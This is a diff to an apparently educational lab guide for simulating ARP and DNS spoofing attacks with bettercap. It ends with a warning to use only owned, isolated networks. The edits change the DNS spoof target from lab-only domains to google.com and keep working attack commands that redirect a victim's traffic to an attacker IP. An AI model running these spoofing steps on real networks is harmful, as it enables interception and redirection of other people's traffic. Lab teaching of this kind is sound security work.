@@ -20,6 +20,8 @@ sudo bettercap -iface wlan0
 
 Replace `wlan0` with your actual interface — use `eth0` for Ethernet.
 
+💡 From this step on, you should run everything inside bettercap. This means you should see a **constant yellow highlight** in your terminal.
+
 ---
 
 #### Gateway Spoof (Victim ↔ Router/Internet)
@@ -31,7 +33,7 @@ net.probe on
 
 ```
 
-**Step 3.** Note the Victim's IP and Router's IP from the output.
+**Step 3.** Note the Victim's IP and router's IP from the output, OR get the victim's IP from a command on the victim device.
 
 **Step 4.** Set the ARP spoof target and enable **full-duplex mode**:
 
@@ -56,15 +58,15 @@ This ensures you intercept traffic going TO and FROM the victim.
 
 ```
 set dns.spoof.ttl 300
-set [dns.spoof.domains](http://dns.spoof.domains) testsite.local,fakebank.local
+set dns.spoof.domains google.com
 set dns.spoof.address <ATTACKER_IP>
 dns.spoof on
 ```
 
 Replace `<ATTACKER_IP>` with the attacker Pi's IP address.
 
-
 ⚠️ **dns.spoof.ttl 300** sets the TTL to 300 seconds. The default (1024 seconds) causes spoofed DNS entries to persist on the victim long after you stop the attack. A low TTL ensures the victim's cache expires quickly during cleanup.
+💡 **set dns.spoof.domains google.com** prevents the victim from accessing google. If you want to spoof more than one domain, add the domains and separate them with commas.
 
 ### Part C: (Optional) Fake Server
 
@@ -157,6 +159,6 @@ cat /proc/sys/net/ipv4/ip_forward
 - ARP Spoof module: https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/
 - DNS Spoof module: https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/
 
-**Ethical Warning:** This simulation must only be performed on hardware you own and a private, isolated network. Intercepting traffic on public or unauthorized networks is illegal.
+**Ethical Warning:** This simulation must only be performed on hardware you own and on a private, isolated network. Intercepting traffic on public or unauthorized networks is illegal.
 
 **Alternative:** For a software-only simulation without physical hardware, use GNS3 to virtualize the entire network.
